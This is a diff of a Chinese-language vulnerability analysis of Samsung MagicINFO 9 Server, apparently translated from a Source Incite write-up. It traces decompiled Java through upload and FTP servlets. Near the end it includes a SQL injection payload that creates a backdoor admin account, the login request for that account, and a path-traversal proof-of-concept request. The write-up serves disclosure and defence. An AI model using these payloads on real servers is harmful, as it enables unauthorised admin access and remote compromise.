@@ -71,6 +71,7 @@ SOURCE INCITE
 1. SRC-2025-0004 - Samsung MagicINFO 9 Server ResponseUploadActivity TOCTOU Remote Code Execution Vulnerability  
   
 ## WSServlet 攻击面  
+
 ```
  <servlet> <servlet-name>WSRMService</servlet-name> <servlet-class>com.samsung.magicinfo.protocol.http.service.WSServlet</servlet-class> <init-param> <param-name>CONF_PATH</param-name> <param-value>/WEB-INF/conf/</param-value> </init-param> <init-param> <param-name>SERVICE_DESCRIPTOR</param-name> <param-value> samsung-wsf-service-descriptor.xml </param-value> </init-param> <load-on-startup>1</load-on-startup> </servlet> <servlet-mapping> <servlet-name>WSRMService</servlet-name> <url-pattern>/WSRMService</url-pattern> </servlet-mapping>
 ```  
@@ -83,6 +84,7 @@ SOURCE INCITE
 、REPORT  
 或 COMMAND  
 ——我们会走到下面这段代码：  
+
 ```
  private MOMsg process(MOMsg moMsg) throws BasicException { ServiceOPManager manager = null; manager = ServiceOPManagerFactory.getServiceOPManager(ActionParser.parse(moMsg)); // 1 return manager.process(moMsg); // 2 }
 ```  
@@ -93,6 +95,7 @@ SOURCE INCITE
 ；如果该 web service 请求调用的是 NOTIFY  
 功能，那么这里会返回 com.samsung.magicinfo.protocol.interfaces.NOTIFYExecuter  
 的实例。  
+
 ```
 public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.getLogger(NOTIFYExecuter.class); protected AppBO process(HashMap params) throws BasicException { AppBO responseAppBO = null; String mo_Event = null; try { mo_Event = this.resultSet.getAttribute("MO_EVENT"); } catch (RMQLException ex) { this.logger.error((String)"", (Throwable)ex); throw new BasicException(ex.getMessage(), ex); } try { ServiceDispatcher dispatcher = WSRMServiceDispatcher.getInstance(); ServiceFactory sfc = WSRMServiceFactory.getInstance(); String service_id = sfc.getServiceId(mo_Event, this.appBO.getOperation()); // 3 responseAppBO = (AppBO)dispatcher.startService(service_id, params); // 4 return responseAppBO; } catch (Exception ex) { this.logger.error((String)"", (Throwable)ex); throw new BasicException(ex.getMessage(), ex); } }}
 ```  
@@ -104,6 +107,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 时，代码会尝试确定该请求对应的 service_id  
 。这一点很关键，因为攻击者无法 直接  
 控制它：  
+
 ```
  public String getServiceId(String mo_path, String operation) { for(int i = 0; i < serviceOpMapList.size(); ++i) { ServiceOpMap serviceOpMap = (ServiceOpMap)serviceOpMapList.get(i); // 5 if (operation != null && operation.equals(serviceOpMap.getOperation())) { // 6 if (mo_path == null) { if (serviceOpMap.getMo_path() == null) { return serviceOpMap.getService_id(); } } else { if (serviceOpMap.getMo_path() == null) { return serviceOpMap.getService_id(); } if (mo_path.indexOf(serviceOpMap.getMo_path()) >= 0) { // 7 return serviceOpMap.getService_id(); } } } } return null; }
 ```  
@@ -126,18 +130,21 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 8  
 处调用getServiceOpMapList  
 设置的：  
+
 ```
  private static synchronized boolean initialize() { serviceStore = new HashMap(); ServiceStatusManager serviceStatusManager = ServiceStatusManagerImpl.getInstance(); List serviceList = null; try { serviceList = serviceStatusManager.getServiceManageList(); for(int i = 0; i < serviceList.size(); ++i) { ServiceManageList serviceMgmt = (ServiceManageList)serviceList.get(i); serviceStore.put(serviceMgmt.getService_id(), new ServiceInfo(serviceMgmt.getService_id(), serviceMgmt.getService_name(), serviceMgmt.getClass_name(), serviceMgmt.isLogging())); } serviceOpMapList = serviceStatusManager.getServiceOpMapList(); // 8 } catch (Exception e) { logger.error((Object)e); } return true; }
 ```  
   
 在 ServiceStatusManagerImpl  
 类里可以看到，这只是对数据库的一层 wrapper：  
+
 ```
  public List getServiceOpMapList() throws Exception { return dao.selectServiceOpMapList(); }
 ```  
   
 它在 com/samsung/magicinfo/protocol/servicestatus/dao/ServiceStatusDAOMapper.xml  
 文件中定义：  
+
 ```
  <select id="selectServiceOpMapList" resultType="com.samsung.magicinfo.protocol.entity.ServiceOpMap"> SELECT * FROM MI_RM_MAP_SERVICE_OPERATION </select>
 ```  
@@ -158,6 +165,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 后，就会在 com.samsung.magicinfo.protocol.servicemanager.WSRMServiceDispatcher  
 实例上调用 startService  
 ：  
+
 ```
  public Object startService(String service_id, Map paramMap) throws Exception { ServiceFactory factory = WSRMServiceFactory.getInstance(); ServiceManager manager = null; try { manager = factory.getServiceInstance(service_id); // 9 manager.setParameters(paramMap); return manager.startService(); } catch (Exception e) { throw e; } }
 ```  
@@ -168,6 +176,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 调用很有意思，因为它揭示了 web service 请求的处理类。我们已知有 16 个可用 entry，但到底是哪些类在处理传入的请求体？回到 com.samsung.magicinfo.protocol.servicemanager.WSRMServiceFactory  
 类，我们可以看到 getServiceInstance  
 的定义：  
+
 ```
  public ServiceManager getServiceInstance(String service_id) throws Exception { ActivityContext ctxt = new ActivityContext(service_id); ctxt.setInvokeType(1); return this.getServiceInstance(ctxt); // 10 } public ServiceManager getServiceInstance(ActivityContext ctxt) throws Exception { ServiceManager manager = null; String service_id = ctxt.getServiceID(); ServiceInfo serviceInfo = (ServiceInfo)serviceStore.get(service_id); // 11 if (serviceInfo == null) { throw new ServiceNotFoundException(); } else { try { Class serviceManager = Class.forName(serviceInfo.getService_manager_class()); // 13 manager = (ServiceManager)serviceManager.newInstance(); // 14 } catch (ClassNotFoundException e) { logger.error(e.getMessage()); throw new ServiceNotFoundException(); } catch (InstantiationException e) { logger.error(e.getMessage()); throw new ServiceNotFoundException(); } catch (IllegalAccessException e) { logger.error(e.getMessage()); throw new ServiceNotFoundException(); } if (manager == null) { throw new ServiceNotFoundException(); } else { if (manager != null) { ctxt.setLogging(serviceInfo.isLogging()); manager.setContext(ctxt); manager.setServiceName(serviceInfo.getService_name()); } return manager; // 15 } } }
 ```  
@@ -182,6 +191,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 实例。但 serviceStore  
 是在哪里设置的呢？当然是在 initialize  
 例程里：  
+
 ```
  private static synchronized boolean initialize() { serviceStore = new HashMap(); ServiceStatusManager serviceStatusManager = ServiceStatusManagerImpl.getInstance(); List serviceList = null; try { serviceList = serviceStatusManager.getServiceManageList(); // 12 for(int i = 0; i < serviceList.size(); ++i) { ServiceManageList serviceMgmt = (ServiceManageList)serviceList.get(i); serviceStore.put(serviceMgmt.getService_id(), new ServiceInfo(serviceMgmt.getService_id(), serviceMgmt.getService_name(), serviceMgmt.getClass_name(), serviceMgmt.isLogging())); } serviceOpMapList = serviceStatusManager.getServiceOpMapList(); } catch (Exception e) { logger.error((Object)e); } return true; }
 ```  
@@ -191,12 +201,14 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 处对 getServiceManageList  
 的调用会填充这个 Map  
 ，我们来看看：  
+
 ```
  public List getServiceManageList() throws Exception { return dao.selectServiceManageList(); }
 ```  
   
 这又只是对数据库的一层 wrapper，它在 com/samsung/magicinfo/protocol/servicestatus/dao/ServiceStatusDAOMapper.xml  
 文件中定义：  
+
 ```
  <select id="selectServiceManageList" resultType="com.samsung.magicinfo.protocol.entity.ServiceManageList"> SELECT * FROM MI_RM_INFO_SERVICE_MANAGE </select>
 ```  
@@ -221,6 +233,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
   
 例如，com.samsung.magicinfo.framework.device.service.upload.DeviceUploadServiceManager  
 类就清楚展示了由哪个 activity 来处理传入请求：  
+
 ```
  public class DeviceUploadServiceManager extends ServiceManager { public Object executeService() throws ServiceException, Exception { ServiceOpActivity activity = new DeviceUploadServiceActivity(); // 16 activity.setContext(this.activityContext); Object rt = activity.processActivity(this.paramMap); this.endServiceStatus(); return rt; } }
 ```  
@@ -237,6 +250,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 1  
 处加入了 directoryTraversalChecker  
 代码。  
+
 ```
  public Object process(HashMap params) throws ServiceException { ResultSet rs = (ResultSet)params.get("resultset"); String moDownload = null; Device device = null; boolean onS3Storage = false; try { moDownload = rs.getAttribute("MO_DOWNLOAD"); File file = (File)rs.getObjectAttribute("DOWNLOADABLE_FILE"); String device_id = rs.getAttribute("DEVICE_ID"); String content_type = rs.getAttribute("CONTENT-TYPE"); String contentName = rs.getAttribute("DWN_CONTENT_NAME_ATTR"); String s3Path = ""; String path = CommonConfig.get("UPLOAD_HOME"); if (!path.endsWith("\\") && !path.endsWith("/")) { path = path + File.separator; } if (!onS3Storage) { if (content_type.equals("CONTENT")) { path = path + CommonConfig.get("CAPTURE_DIR"); } else if (content_type.equals("PLAYHISTORY")) { if (contentName.startsWith("FACE")) { path = path + CommonConfig.get("FACE_LOG_DIR"); } else { path = path + CommonConfig.get("POP_LOG_DIR"); } } } else if (onS3Storage) { if (content_type.equals("CONTENT")) { s3Path = s3Path + CommonConfig.get("s3.CAPTURE_DIR") + device_id + "/"; } else if (content_type.equals("PLAYHISTORY")) { s3Path = s3Path + CommonConfig.get("s3.POP_DIR") + device_id + "/"; } } Path destinationPath = Paths.get(SecurityUtils.directoryTraversalChecker(path + File.separator + contentName, (String)null)); // 1 Path sourcePath = Paths.get(file.getPath()); try { Files.write(destinationPath, Files.readAllBytes(sourcePath)); } catch (Exception e) { this.logger.error("[MagicInfo_ScreenCaptureUpload] NIO write Exception! contentName : " + contentName + " e : " + e.getMessage()); }
 ```  
@@ -249,9 +263,11 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 2  
 处调用了 saveAsFile  
 ：  
+
 ```
  for(int i = 0; i < attachmentIndexes.size(); ++i) { InputStream fin = null; try { fin = mm.getBodyPart((Integer)attachmentIndexes.get(i)).getInputStream(); File file = this.saveAsFile((String)attachmentFilenames.get(i), fin); // 2 DownloadFile downFile = new DownloadFile(); downFile.setFile(file); downFile.setContentName((String)attachmentFilenames.get(i)); downFile.setContentType(contentType); downFile.setContentID((String)attachmentFilenames.get(i)); attachmentList.add(downFile); } catch (Exception var32) { } finally { if (fin != null) { try { fin.close(); } catch (Exception var31) { } } } }
 ```  
+
 ```
  private File saveAsFile(String filePartName, InputStream in) throws IOException { File file = null; try { Path tempFile = Paths.get(this.getFilePath(filePartName)); // 3 Files.write(tempFile, IOUtils.toByteArray(in)); file = tempFile.toFile(); return file; } catch (Exception e) { this.logger.error("[MagicInfo_WSServeltFileUpload] NIO write Exception! fileName : " + filePartName + " e : " + e.getMessage()); throw new IOException(e.getMessage()); } }
 ```  
@@ -275,6 +291,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
   
 如果我们查看 PostgreSQL_checklist.json  
 文件，会看到类似下面这样的 JSON：  
+
 ```
 { "items" : [ { "title" : "check MI_CMS_CODE_MEDIA table", "check_query" : "select count(*) from MI_CMS_CODE_MEDIA", "resolve_query" : [ //... ], "expect" : "18", "description" : "Check the number of data stored in the MI_CMS_CODE_MEDIA table." } ]}
 ```  
@@ -282,6 +299,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 如果攻击者把 check_query  
 覆盖成可控的 stacked query，那么就可以在 com.samsung.magicinfo.framework.setup.manager.ServerSetupInfoImpl  
 中的如下位置触发 SQL 执行：  
+
 ```
  public void checkCheckingItemsFromJson() throws ConfigException { List<DbSchemeCheckEntity> dbSchemeCheckEntities = this.loadDbSchemeCheckList(); // 1 DbSchemeDao dbSchemeDao = new DbSchemeDao(); try { dbSchemeDao.deleteDbSchemeCheckResult(); DatabaseManagerDao dao = new DatabaseManagerDao(); for(DbSchemeCheckEntity dbSchemeCheckEntity : dbSchemeCheckEntities) { Integer count = dao.runSelectQuery(dbSchemeCheckEntity.getCheckQuery()); // 2 boolean checkResult = count.equals(Integer.valueOf(dbSchemeCheckEntity.getExpect())); dbSchemeDao.insertCheckingResult(dbSchemeCheckEntity.getTestId(), dbSchemeCheckEntity.getTitle(), checkResult, dbSchemeCheckEntity.getDescription()); } } catch (Exception e) { this.logger.error(e.getMessage()); } }
 ```  
@@ -295,12 +313,14 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 实例取出 CheckQuery  
 ，得到攻击者可控的 SQL 查询，然后触发 runSelectQuery  
 ，从而实现对数据库的完全接管。到达这段代码的路径如下：  
+
 ```
 com.samsung.magicinfo.framework.setup.manager.ServerSetupInfoImpl.checkCheckingItemsFromJson() com.samsung.magicinfo.protocol.util.DailyJob.checkDbValidation() com.samsung.magicinfo.protocol.util.DailyJob.execute(JobExecutionContext) // triggered daily
 ```  
   
 这个 checkDbValidation  
 会每天执行：  
+
 ```
  private void checkDbValidation() throws Exception { ServerSetupInfo serverSetupInfo = ServerSetupInfoImpl.getInstance(); serverSetupInfo.checkCheckingItemsFromJson(); // 3 //... }
 ```  
@@ -309,6 +329,7 @@ com.samsung.magicinfo.framework.setup.manager.ServerSetupInfoImpl.checkCheckingI
 1  
 处的 loadDbSchemeCheckList  
 ：  
+
 ```
  public List loadDbSchemeCheckList() throws ConfigException { List<DbSchemeCheckEntity> dbSchemeCheckEntities = new ArrayList(); String confFilePath = this.getDbSchemeCheckItemsFilePath(); // 4 try (FileReader fileReader = new FileReader(confFilePath)) { JsonParser jsonParser = new JsonParser(); JsonElement parse = jsonParser.parse((Reader)fileReader); JsonObject asJsonObject = parse.getAsJsonObject(); JsonArray items = asJsonObject.getAsJsonArray("items"); for(int i = 0; i < items.size(); ++i) { JsonObject jsonObject = items.get(i).getAsJsonObject(); String title = jsonObject.get("title").getAsString(); String checkQuery = jsonObject.get("check_query").getAsString(); List<String> resolveQueries = new ArrayList(); JsonElement resolveQuery = jsonObject.get("resolve_query"); JsonArray jsonArray = resolveQuery.getAsJsonArray(); for(int k = 0; k < jsonArray.size(); ++k) { resolveQueries.add(jsonArray.get(k).getAsJsonObject().get("query").toString().replace("\"", "")); } String expect = jsonObject.get("expect").getAsString(); String description = jsonObject.get("description").getAsString(); DbSchemeCheckEntity dbSchemeCheckItem = new DbSchemeCheckEntity(); dbSchemeCheckItem.setTestId(i); dbSchemeCheckItem.setTitle(title); dbSchemeCheckItem.setCheckQuery(checkQuery); dbSchemeCheckItem.setResolveQuery(resolveQueries); dbSchemeCheckItem.setExpect(expect); dbSchemeCheckItem.setDescription(description); dbSchemeCheckEntities.add(dbSchemeCheckItem); } return dbSchemeCheckEntities; } catch (Exception var29) { throw new ConfigException("Can't load check list."); } }
 ```  
@@ -317,6 +338,7 @@ com.samsung.magicinfo.framework.setup.manager.ServerSetupInfoImpl.checkCheckingI
 4  
 ，它调用了 getDbSchemeCheckItemsFilePath  
 ：  
+
 ```
  private String getDbSchemeCheckItemsFilePath() throws ConfigException { String dbSchemeCheckItemsFilePath = ""; String magicInfoHome = System.getenv("MAGICINFO_PREMIUM_HOME"); if (magicInfoHome != null && !magicInfoHome.equals("")) { dbSchemeCheckItemsFilePath = magicInfoHome + File.separator + "runtime" + File.separator + "upload" + File.separator + "validation" + File.separator + CommonConfig.get("wsrm.dbVendor") + "_checklist.json"; } return dbSchemeCheckItemsFilePath; }
 ```  
@@ -327,12 +349,14 @@ com.samsung.magicinfo.framework.setup.manager.ServerSetupInfoImpl.checkCheckingI
   
 这里的原语（primitive）是：攻击者可以执行一系列 SQL 语句。我们目前还没有足够权限去执行 COPY (SELECT '') to PROGRAM 'cmd /c mspaint')  
 这种"一步到位"的操作。但我们可以注入查询来插入一个新的管理员用户：  
+
 ```
 insert into mi_user_info_user (user_id, user_name, password, email, organization, team, job_position, phone_num, mobile_num, create_date, last_login_date, modify_date, is_approved, is_deleted, root_group_id, os_type, serial_num, using_mobile, is_reject, reject_reason, ldap_info, ldap_user_id, is_first_login, is_reset_pwd) values ('hacker', 'hacker', '$2a$10$b0G4pkAMSG/kqMeufR5sYOq6ou.A10YDmLVlKchC.2bVrcRthvwlu', 'hacker@samsung.com', 'ROOT', '', '', '', '', current_timestamp, current_timestamp, current_timestamp , 'Y', 'N', '0', null, null, null, 'N', null, null, '', true, 'Y' );insert into mi_user_map_group_user (user_id, group_id) values ('hacker', 0);insert into mi_user_map_role_user (user_id, role_id) values ('hacker', 1);insert into mi_user_map_dashboard (user_id, dashboard_id, priority) values ('hacker', 1, 1);insert into mi_user_map_dashboard (user_id, dashboard_id, priority) values ('hacker', 2, 2);
 ```  
   
 执行上述查询后，攻击者就能添加一个管理员用户 hacker:7v4e2R1DeD3kCoZ4j3  
 。接下来就可以用下面这个请求登录：  
+
 ```http
 POST /MagicInfo/restapi/v2.0/auth HTTP/1.1Host: [target]:7001Content-Type: application/jsonContent-Length: 88{ "password": "7v4e2R1DeD3kCoZ4j3", "username": "hacker", "osName": "Linux", "osVersion": "1337"}
 ```  
@@ -351,6 +375,7 @@ POST /MagicInfo/restapi/v2.0/auth HTTP/1.1Host: [target]:7001Content-Type: appli
 变量做了 directory traversal 检查，而 localPathByIp  
 是由 cifsLoginId  
 等攻击者可控的字符串拼出来的：  
+
 ```
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding("UTF-8"); response.setContentType("text/html; charset=UTF-8"); try { String miUserId = StrUtils.nvl(request.getParameter("miUserId")).equals("") ? "admin" : request.getParameter("miUserId"); String groupId = StrUtils.nvl(request.getParameter("groupId")).equals("") ? "0" : request.getParameter("groupId"); long nGroupId = Long.parseLong(groupId); String cifsContentName = StrUtils.nvl(request.getParameter("cifsContentName")).equals("") ? "" : request.getParameter("cifsContentName"); String cifsIP = StrUtils.nvl(request.getParameter("cifsIp")).equals("") ? "" : request.getParameter("cifsIp"); String cifsLoginId = StrUtils.nvl(request.getParameter("cifsLoginId")).equals("") ? "" : request.getParameter("cifsLoginId"); String cifsPassword = StrUtils.nvl(request.getParameter("cifsPassword")).equals("") ? "" : request.getParameter("cifsPassword"); String cifsDirectory = StrUtils.nvl(request.getParameter("cifsDirectory")).equals("") ? "" : request.getParameter("cifsDirectory"); String cifsRefreshInterval = StrUtils.nvl(request.getParameter("cifsRefreshInterval")).equals("") ? "1" : request.getParameter("cifsRefreshInterval"); long nCifsRefreshInterval = Long.parseLong(cifsRefreshInterval); String canRefresh = StrUtils.nvl(request.getParameter("canRefresh")).equals("") ? "Y" : request.getParameter("canRefresh"); long loginRetryMaxCount = Long.parseLong(StrUtils.nvl(request.getParameter("loginRetryMaxCount")).equals("") ? "1" : request.getParameter("loginRetryMaxCount")); String canLoginRetry = StrUtils.nvl(request.getParameter("canLoginRetry")).equals("") ? "Y" : request.getParameter("canLoginRetry"); String CONTENTS_HOME = CommonConfig.get("CONTENTS_HOME").replace('/', File.separatorChar) + File.separatorChar + "contents_home"; String contentId = UUID.randomUUID().toString().toUpperCase(); cifsDirectory = "smb://" + cifsIP + cifsDirectory; String localPathByIp = SecurityUtils.directoryTraversalChecker(CONTENTS_HOME + File.separator + "CIFS_" + ContentUtils.getFolderIp(cifsIP) + '_' + cifsLoginId, (String)null); // 1 this.logger.info("[MagicInfo_CIFS_Servlet] " + cifsContentName + ContentUtils.getFolderIp(cifsIP) + cifsLoginId + cifsDirectory + cifsRefreshInterval + " by " + miUserId + " in " + groupId + ", canRefresh[" + canRefresh + "] loginRetryMaxCount[> boolean scheduledJob = false; Runnable runCifs = new CifsFileDownloadThread(miUserId, nGroupId, contentId, cifsContentName, cifsIP, cifsLoginId, cifsPassword, localPathByIp, cifsDirectory, nCifsRefreshInterval, scheduledJob, canRefresh, loginRetryMaxCount, canLoginRetry); Thread threadCifs = new Thread(runCifs); threadCifs.start(); } catch (Exception e) { response.sendError(600, e.toString()); this.logger.error((Object)e); } }
 ```  
@@ -367,6 +392,7 @@ tl;dr; 就是：他们搭了一个自己的 CIFS server，并把用户名设置�
 不过我们还有个小问题：还记得有两个 servlet 吗？在分析 com.samsung.magicinfo.protocol.file.FtpFileDownloadServlet  
 类时，我们可以看到一个名为 localPathByIp  
 的路径会由攻击者可控的字符串拼出来。  
+
 ```
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding("UTF-8"); response.setContentType("text/html; charset=UTF-8"); try { String miUserId = StrUtils.nvl(request.getParameter("miUserId")).equals("") ? "admin" : request.getParameter("miUserId"); String groupId = StrUtils.nvl(request.getParameter("groupId")).equals("") ? "0" : request.getParameter("groupId"); long nGroupId = Long.parseLong(groupId); String ftpContentName = StrUtils.nvl(request.getParameter("ftpContentName")).equals("") ? "" : request.getParameter("ftpContentName"); String ftpIP = StrUtils.nvl(request.getParameter("ftpIp")).equals("") ? "" : request.getParameter("ftpIp"); String portStr = StrUtils.nvl(request.getParameter("ftpPort")).equals("") ? "21" : request.getParameter("ftpPort"); int port = Integer.parseInt(portStr); String ftpLoginId = StrUtils.nvl(request.getParameter("ftpLoginId")).equals("") ? "" : request.getParameter("ftpLoginId"); // 1 String ftpPassword = StrUtils.nvl(request.getParameter("ftpPassword")).equals("") ? "" : request.getParameter("ftpPassword"); String ftpDirectory = StrUtils.nvl(request.getParameter("ftpDirectory")).equals("") ? "" : request.getParameter("ftpDirectory"); // 2 String ftpRefreshInterval = StrUtils.nvl(request.getParameter("ftpRefreshInterval")).equals("") ? "1" : request.getParameter("ftpRefreshInterval"); long nFtpRefreshInterval = Long.parseLong(ftpRefreshInterval); String canRefresh = StrUtils.nvl(request.getParameter("canRefresh")).equals("") ? "Y" : request.getParameter("canRefresh"); long loginRetryMaxCount = Long.parseLong(StrUtils.nvl(request.getParameter("loginRetryMaxCount")).equals("") ? "1" : request.getParameter("loginRetryMaxCount")); String canLoginRetry = StrUtils.nvl(request.getParameter("canLoginRetry")).equals("") ? "Y" : request.getParameter("canLoginRetry"); String CONTENTS_HOME = CommonConfig.get("CONTENTS_HOME").replace('/', File.separatorChar) + File.separatorChar + "contents_home"; String contentId = UUID.randomUUID().toString().toUpperCase(); this.logger.info("[MagicInfo_FTP_Servlet] " + ftpContentName + ContentUtils.getFolderIp(ftpIP) + portStr + ftpLoginId + ftpPassword + ftpDirectory + ftpRefreshInterval + miUserId + groupId + ", canRefresh[" + canRefresh + "] loginRetryMaxCount[> String localPathByIp = CONTENTS_HOME + File.separator + "FTP_" + ContentUtils.getFolderIp(ftpIP) + '_' + ftpLoginId + '_' + ftpDirectory.replace('/', '_'); // 3 boolean scheduledJob = false; Runnable runFTP = new FtpFileDownloadThread(miUserId, nGroupId, contentId, ftpContentName, ftpIP, port, ftpLoginId, ftpPassword, localPathByIp, ftpDirectory, nFtpRefreshInterval, scheduledJob, canRefresh, loginRetryMaxCount, canLoginRetry); Thread threadFTP = new Thread(runFTP); threadFTP.start(); } catch (Exception e) { response.sendError(600, e.toString()); this.logger.error((Object)e); } }
 ```  
@@ -392,6 +418,7 @@ server 下载并再次覆盖index.html
 ，从而实现认证绕过！  
   
 概念验证：  
+
 ```http
 GET /MagicInfo/servlet/FtpFileDownloadServlet?ftpLoginId=user&ftpPassword=pwd&ftpIp=[attacker]&ftpPort=2121&ftpDirectory=test%5c..%5c..%5c..%5c..%5cserver%5c HTTP/1.1Host: [target]:7002Accept: application/json
 ```  
@@ -407,6 +434,7 @@ GET /MagicInfo/servlet/FtpFileDownloadServlet?ftpLoginId=user&ftpPassword=pwd&ft
   
 当我们尝试使用 JSP 文件时，它似乎不会被复制过去，因此攻击者无法直接拿到一个 remote code injection primitive。我们来看看为什么它不会处理 JSP 文件。在 com.samsung.magicinfo.protocol.file.FtpGetFiles  
 类里可以看到：  
+
 ```
  private boolean getFileList() throws IOException, SQLException { FTPFile[] ftpFiles = this.client.listFiles(); // 1 if (ftpFiles == null) { return false; } else { for(FTPFile file : ftpFiles) { if (file.isFile() && !file.isDirectory()) { boolean validType = false; String[] tempName = file.getName().split("[.]"); int sizeOfSplitName = 0; if (tempName.length > 0) { sizeOfSplitName = tempName.length - 1; validType = this.contentInfo.getCodeFile(tempName[sizeOfSplitName].toUpperCase()).equalsIgnoreCase(""); // 2 } if (!validType) { // 3 this.remoteFiles.add(this.makeRemoteFileInfo(file.getName(), file.getSize(), "NONE", "N")); // 4 } } } return true; }
 ```  
@@ -418,23 +446,27 @@ GET /MagicInfo/servlet/FtpFileDownloadServlet?ftpLoginId=user&ftpPassword=pwd&ft
 处调用 getCodeFile  
 。在 com.samsung.magicinfo.framework.content.manager.ContentInfoImpl  
 类中：  
+
 ```
  public String getCodeFile(String fileType) throws SQLException { return this.dao.getCodeFile(fileType); }
 ```  
   
 然后在 com.samsung.magicinfo.framework.content.dao.ContentDao  
 类中：  
+
 ```
  public String getCodeFile(String fileType) throws SQLException { Map<String, Object> map = new HashMap(); map.put("fileType", fileType); map.put("ConstMEDIA_TYPE_IMAGE", "IMAGE"); map.put("ConstMEDIA_TYPE_MOVIE", "MOVIE"); map.put("ConstMEDIA_TYPE_FLASH", "FLASH"); map.put("ConstMEDIA_TYPE_OFFICE", "OFFICE"); map.put("ConstMEDIA_TYPE_PDF", "PDF"); List<String> list = ((ContentDaoMapper)this.getMapper()).getCodeFile(map); return list != null && list.size() > 0 ? (String)list.get(0) : ""; }
 ```  
   
 最后在 com.samsung.magicinfo.framework.content.dao.ContentDaoMapper.xml  
 文件中：  
+
 ```
  <select id="getCodeFile" parameterType="map" resultType="string"> SELECT MEDIA_TYPE FROM MI_CMS_CODE_FILE WHERE (MEDIA_TYPE = #{ConstMEDIA_TYPE_IMAGE} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_MOVIE} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_FLASH} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_OFFICE} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_PDF}) AND FILE_TYPE = #{fileType} </select>
 ```  
   
 随手做一个数据库查询，可以发现有 52 个 office 扩展名我们没法用来（ab）use 以实现远程代码执行：  
+
 ```
 SELECT DISTINCT FILE_TYPE FROM MI_CMS_CODE_FILE WHERE (MEDIA_TYPE = 'IMAGE' OR MEDIA_TYPE = 'MOVIE' OR MEDIA_TYPE = 'FLASH' OR MEDIA_TYPE = 'OFFICE' OR MEDIA_TYPE = 'PDF')
 ```  
